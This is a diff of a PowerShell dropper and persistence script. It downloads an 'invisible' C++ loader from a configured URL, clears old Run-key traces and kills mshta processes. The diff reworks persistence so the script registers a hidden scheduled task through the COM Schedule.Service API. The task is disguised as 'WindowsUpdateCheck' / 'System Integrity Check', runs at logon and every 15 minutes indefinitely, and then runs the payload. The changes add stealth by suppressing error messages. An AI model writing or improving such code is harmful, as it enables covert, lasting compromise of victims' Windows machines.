@@ -1,5 +1,5 @@
 # ==========================================
-# FINAL DEPLOY SCRIPT (C++ LOADER METHOD)
+# FINAL DEPLOY SCRIPT (C++ LOADER + COM)
 # ==========================================
 
 # --- CONFIGURATION ---
@@ -10,15 +10,12 @@ $TaskName   = "WindowsUpdateCheck"
 
 # --- 1. CLEANUP (Remove Old Traces) ---
 try {
-    # Remove old registry keys if they exist
+    # Remove old registry keys
     Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
     Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
     
     # Stop old processes
     Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
-    
-    # Remove old tasks if they are broken/wrong
-    # We don't unregister if it's already correct, but for safety we can force overwrite later
 } catch {}
 
 # --- 2. EXECUTION (Run Payload Now) ---
@@ -43,51 +40,48 @@ function Run-Payload {
     } catch {}
 }
 
-# --- 3. PERSISTENCE (Install C++ Loader) ---
+# --- 3. PERSISTENCE (Install C++ Loader via COM) ---
 try {
-    # A. Download the C++ Loader
+    # A. Download the C++ Loader (Invisible EXE)
     try {
         $wc = New-Object Net.WebClient
         $wc.DownloadFile($LoaderUrl, $LoaderPath)
-    } catch {
-        Write-Host "Loader Download Failed (Using existing if avail)" -F Yellow
-    }
+    } catch {}
 
-    # B. Register the Scheduled Task
-    $exists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+    # B. Register Task via COM Object (Reliable/Infinite)
+    $service = New-Object -ComObject Schedule.Service
+    $service.Connect()
+    $rootFolder = $service.GetFolder("\")
     
-    if ($true) { 
-        $Action = New-ScheduledTaskAction -Execute $LoaderPath
-        
-        # Trigger 1: Run immediately when User Logs on
-        $Trigger1 = New-ScheduledTaskTrigger -AtLogon
-        
-        # Trigger 2: Run Once (Now) -> Repeat every 15 mins -> Indefinitely
-        # TRICK: We create a simple trigger first, then manually force the "Indefinitely" duration
-        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
-        
-        # Principal: Run with Highest Privileges
-        $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
-        
-        # Settings: Hidden, Parallel Execution
-        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel
-        
-        # Register the task (This usually defaults to 1 day duration if not specified)
-        $Task = Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force
-        
-        # C. MODIFY THE TASK TO BE TRULY INDEFINITE (The Fix)
-        # We edit the raw XML of the task to set Duration to "PT0S" (which means Indefinitely in XML schema)
-        $TaskTrigger = $Task.Triggers[1] # Select the second trigger (the repetition one)
-        $TaskTrigger.Repetition.Duration = [TimeSpan]::Zero # Zero often maps to "Indefinitely" in PS object model
-        $Task | Set-ScheduledTask -ErrorAction SilentlyContinue
-        
-        Write-Host "✅ C++ Persistence Installed (Zero Flash)." -F Green
-    }
+    # Define Task
+    $taskDef = $service.NewTask(0)
+    $taskDef.RegistrationInfo.Description = "System Integrity Check"
+    $taskDef.Settings.Enabled = $true
+    $taskDef.Settings.Hidden = $true
+    $taskDef.Settings.MultipleInstances = 2 # Parallel Execution
+    $taskDef.Settings.DisallowStartIfOnBatteries = $false
+    $taskDef.Settings.StopIfGoingOnBatteries = $false
+    
+    # Create Trigger (Logon + 15 Min Infinite Loop)
+    $trigger = $taskDef.Triggers.Create(9) # 9 = LogonTrigger
+    $trigger.Id = "LogonTrigger"
+    $trigger.Enabled = $true
+    $trigger.Repetition.Interval = "PT15M" # 15 Minutes
+    # Note: We do NOT set Duration, so it defaults to Indefinite.
+    
+    # Create Action (Run the C++ Loader)
+    $action = $taskDef.Actions.Create(0) # 0 = Execute
+    $action.Path = $LoaderPath
+    
+    # Register Task
+    # 6 = CreateOrUpdate, 4 = Run as Interactive User
+    $rootFolder.RegisterTaskDefinition($TaskName, $taskDef, 6, "BUILTIN\Users", $null, 4) | Out-Null
+    
+    Write-Host "✅ C++ Persistence Installed (Infinite Loop)." -F Green
+
 } catch {
     Write-Host "⚠️ Persistence Setup Failed: $($_.Exception.Message)" -F Red
 }
 
-
 # --- 4. START ---
 Run-Payload
-
